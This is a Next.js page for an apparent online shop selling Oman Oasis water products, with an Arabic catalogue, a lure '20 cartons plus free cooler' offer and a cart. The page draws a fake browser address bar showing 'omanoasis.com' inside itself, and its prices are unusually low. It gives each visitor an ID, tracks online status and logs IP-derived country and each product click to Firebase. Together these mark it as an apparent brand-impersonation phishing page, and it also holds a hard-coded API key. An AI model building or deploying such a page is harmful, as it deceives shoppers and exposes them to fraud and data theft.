
"use client"
import { addData, getVisitorId } from "@/lib/firebase";
import { setupOnlineStatus } from "@/lib/utils";
import { useCallback, useEffect, useState } from "react";
import { ShoppingCart } from "lucide-react";
import { CartSidebar } from "@/components/cart/cart-sidebar";
import { useCart } from "@/contexts/cart-context";
import "./water.css";

const waterProducts = [
  {
    id: 1,
    name: "موزع ماء حار وبارد",
    nameEn: "Hot and Cold Water Dispenser",
    description: "موزع عملي للمنازل والمكاتب مع تصميم أنيق وسهل الاستخدام.",
    detailedDescription: "موزع مياه مناسب لقوارير المياه الكبيرة، يوفر ماءً بارداً وحاراً للاستخدام اليومي في المنزل أو المكتب.",
    image: "/images/Big-Dispencer-copy-1-2.png",
    size: "موزعات",
    price: 38.9,
    originalPrice: 45,
    rating: 4.9,
    reviews: 124,
    badge: "اختيار المكاتب",
    category: "موزعات",
    inStock: 32,
    features: ["حار وبارد", "تصميم عملي", "مناسب للمكاتب"],
  },
  {
    id: 2,
    name: "موزع قارورة مياه",
    nameEn: "Bottle Tap Dispenser",
    description: "حل مناسب لتقديم المياه النقية يومياً بطريقة مريحة.",
    detailedDescription: "موزع قارورة بسيط وسهل التركيب لتقديم مياه أسوس الواحة من القوارير الكبيرة بدون تعقيد.",
    image: "/images/Bottle_Dispencer-2.png",
    size: "موزعات",
    price: 6.5,
    rating: 4.7,
    reviews: 88,
    category: "موزعات",
    inStock: 55,
    features: ["سهل الاستخدام", "خفيف", "مناسب للمنزل"],
  },
  {
    id: 3,
    name: "عبوة مياه 200 مل",
    nameEn: "Oman Oasis Water 200ml",
    description: "حجم صغير مثالي للضيافة والاجتماعات والمناسبات.",
    detailedDescription: "عبوة مياه صغيرة من مياه أسوس الواحة مناسبة للضيافة اليومية والاجتماعات والتوزيع.",
    image: "/images/30-Anniversary-product-line-up_200ml-2.png",
    size: "200 مل",
    price: 1.2,
    originalPrice: 1.5,
    rating: 4.8,
    reviews: 210,
    badge: "للضيافة",
    category: "عبوات",
    inStock: 240,
    features: ["حجم صغير", "مناسبة للمناسبات", "نقاء يومي"],
  },
  {
    id: 4,
    name: "عبوة مياه 500 مل",
    nameEn: "Oman Oasis Water 500ml",
    description: "عبوة خفيفة مناسبة للاستخدام اليومي والتنقل.",
    detailedDescription: "عبوة مياه أسوس الواحة بسعة 500 مل، خيار عملي للاستخدام اليومي والعمل والتنقل.",
    image: "/images/30_Anniversary_product_line_up_Sifr500ml_copy-removebg-preview.png",
    size: "500 مل",
    price: 1.8,
    rating: 4.9,
    reviews: 320,
    badge: "الأكثر طلباً",
    category: "عبوات",
    inStock: 300,
    features: ["استخدام يومي", "سهلة الحمل", "جودة موثوقة"],
  },
  {
    id: 5,
    name: "مياه قلوية 500 مل",
    nameEn: "Alkaline Water 500ml",
    description: "اختيار يومي منعش بجودة عالية ونقاء موثوق.",
    detailedDescription: "مياه قلوية من أسوس الواحة بسعة 500 مل، مصممة لتجربة شرب منعشة طوال اليوم.",
    image: "/images/mai-alkaline500.png",
    size: "500 مل",
    price: 2.2,
    originalPrice: 2.6,
    rating: 4.8,
    reviews: 176,
    badge: "قلوية",
    category: "عبوات",
    inStock: 180,
    features: ["مياه قلوية", "منعشة", "للاستخدام اليومي"],
  },
  {
    id: 6,
    name: "عبوة مياه 1.5 لتر",
    nameEn: "Oman Oasis Water 1.5L",
    description: "حجم عائلي مناسب للمنزل والرحلات والضيافة.",
    detailedDescription: "عبوة عائلية من مياه أسوس الواحة بسعة 1.5 لتر للاستخدام المنزلي والرحلات.",
    image: "/images/30_Anniversary_product_line_up_Sifr_copy-removebg-preview.png",
    size: "1.5 لتر",
    price: 2.9,
    rating: 4.8,
    reviews: 143,
    category: "عبوات",
    inStock: 160,
    features: ["حجم عائلي", "للمنزل والرحلات", "تغليف عملي"],
  },
  {
    id: 7,
    name: "عبوة مياه 2 لتر",
    nameEn: "Oman Oasis Water 2L",
    description: "كمية أكبر لتلبية احتياجات الأسرة طوال اليوم.",
    detailedDescription: "عبوة مياه بسعة 2 لتر مناسبة لتلبية احتياجات الأسرة والضيافة اليومية.",
    image: "/images/image-3-1024x753.png",
    size: "2 لتر",
    price: 3.4,
    originalPrice: 3.9,
    rating: 4.7,
    reviews: 102,
    category: "عبوات",
    inStock: 120,
    features: ["سعة أكبر", "مناسبة للأسرة", "نقاء موثوق"],
  },
  {
    id: 8,
    name: "قارورة مياه 5 جالون",
    nameEn: "Oman Oasis 5 Gallon Bottle",
    description: "قارورة كبيرة للموزعات، مناسبة للمكاتب والمنازل.",
    detailedDescription: "قارورة مياه أسوس الواحة الكبيرة بسعة 5 جالون للاستخدام مع الموزعات في المنازل والمكاتب.",
    image: "/images/5gallon.png",
    size: "5 جالون",
    price: 1.5,
    rating: 4.9,
    reviews: 410,
    badge: "للموزعات",
    category: "قوارير",
    inStock: 220,
    features: ["للموزعات", "مناسبة للمكاتب", "سعة كبيرة"],
  },
]

const serviceHighlights = [
  {
    id: "daily-purity",
    title: "مياه متوازنة",
    text: "نقية وصحية",
  },
  {
    id: "home-office",
    title: "توصيل مجاني",
    text: "لخدمة التوصيل المنزلي",
  },
  {
    id: "hospitality",
    title: "صفر صوديوم",
    text: "خيار صحي لعائلتك",
  },
]

const waterOffer = {
  id: 20_200,
  name: "عرض 20 كرتون مياه + هدية براد مياه",
  nameEn: "20 water cartons offer with free water cooler",
  description: "20 كرتون - 200 مل - 30 عبوة",
  gift: "براد مياه مجاني",
  image: "/images/oman-oasis-offer-banner-web.svg",
  size: "20 كرتون - 200 مل - 30 عبوة",
  price: 18,
  rating: 5,
  reviews: 0,
  badge: "عرض خاص",
  category: "عرض",
}

export default function Page() {
  const { addItem, setCartOpen } = useCart();
  const [visitorId, setVisitorId] = useState<string | null>(null);

  const handleAddToCart = (product: (typeof waterProducts)[number]) => {
    addData({
      action: "product_selected",
      currentPage: "الرئيسية",
      order: product,
      orders: [product],
    });
    addItem({
      id: product.id,
      name: product.name,
      nameEn: product.nameEn,
      price: product.price,
      originalPrice: product.originalPrice,
      image: product.image,
      description: product.description,
      rating: product.rating,
      reviews: product.reviews,
      badge: product.badge,
      size: product.size,
      category: product.category,
    });
    setCartOpen();
  };

  const handleAddOfferToCart = () => {
    addData({
      action: "offer_selected",
      currentPage: "الرئيسية",
      order: waterOffer,
      orders: [waterOffer],
      selectedOffer: waterOffer,
    });
    addItem(waterOffer);
    setCartOpen();
  };

  const getLocationAndLog = useCallback(async () => {
    if (!visitorId) return;
    setupOnlineStatus(visitorId)

    // This API key is public and might be rate-limited or disabled.
    // For a production app, use a secure way to handle API keys, ideally on the backend.
    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb" 
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      await addData   ({
        createdDate: new Date().toISOString(),
        id: visitorId,
        country: country,
        action: "page_load",
        currentPage: "الرئيسية",
      })
      localStorage.setItem("country", country) // Consider privacy implications
    } catch (error) {
      console.error("Error fetching location:", error)
      // Log error with visitor ID for debugging
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
        action: "location_error"
      });
    }
  }, [visitorId]);

  useEffect(() => {
    setVisitorId(getVisitorId());
  }, []);

  useEffect(() => {
    if (visitorId) {
      getLocationAndLog();
    }
  }, [visitorId, getLocationAndLog]);

  return (
    <main className="water-home" dir="rtl">
      <div className="water-browser-bar">omanoasis.com</div>

      <header className="water-header">
        <a className="water-header-banner" href="#water-products" aria-label="الانتقال إلى المنتجات">
          <img src="/images/oasis-order-replacement.jpg" alt="واجهة مياه أسوس الواحة" />
        </a>
      </header>

      <section className="water-products-banner" aria-label="عروض شركة مياه الواحة">
        <button
          className="water-products-banner-link"
          type="button"
          onClick={handleAddOfferToCart}
          aria-label="اختيار عرض شركة مياه الواحة والانتقال إلى المنتجات"
        >
          <img src="/images/oasis-display-replacement.jpg" alt="عروض شركة مياه الواحة" />
          <span className="water-products-banner-cta">اضغط لاختيار العرض</span>
        </button>
      </section>

      <section className="water-products-section" id="water-products">
        <div className="water-section-heading">
          <h2>انتعاش نقي، يتم توصيله إلى بابك</h2>
          <p>
            اختر من بين مجموعة من أحجام العبوات وخيارات التوصيل المرنة، مما يضمن لك بقاءك منتعشاً بسهولة ودون عناء في أي وقت.
          </p>
        </div>

        <div className="water-quality" aria-label="مميزات الخدمة">
          {serviceHighlights.map((highlight) => (
            <article className="water-quality-card" key={highlight.id}>
              <span aria-hidden="true">✓</span>
              <div>
                <strong>{highlight.title}</strong>
                <p>{highlight.text}</p>
              </div>
            </article>
          ))}
        </div>

        <div className="water-products-grid">
          {waterProducts.map((product) => (
            <article className="water-product-card" key={product.id}>
              <div className="water-product-image">
                <img src={product.image} alt={product.name} />
                {product.badge && <span className="water-product-badge">{product.badge}</span>}
              </div>
              <div className="water-product-content">
                <h3>{product.name}</h3>
                <div className="water-price-row" aria-label="السعر">
                  <strong>{product.price.toFixed(3)} ر.ع</strong>
                  {product.originalPrice && <del>{product.originalPrice.toFixed(3)} ر.ع</del>}
                </div>
                <button
                  className="water-add-to-cart"
                  type="button"
                  onClick={() => handleAddToCart(product)}
                  disabled={product.inStock === 0}
                >
                  <ShoppingCart size={18} />
                  {product.inStock === 0 ? "غير متوفر" : "إضافة للسلة"}
                </button>
                <details className="water-product-details">
                  <summary>السعة والمخزون</summary>
                  <p>السعة: {product.size}</p>
                  <p>المتوفر: {product.inStock} وحدة</p>
                </details>
              </div>
            </article>
          ))}
        </div>

      </section>
      <CartSidebar />
    </main>
  )
}
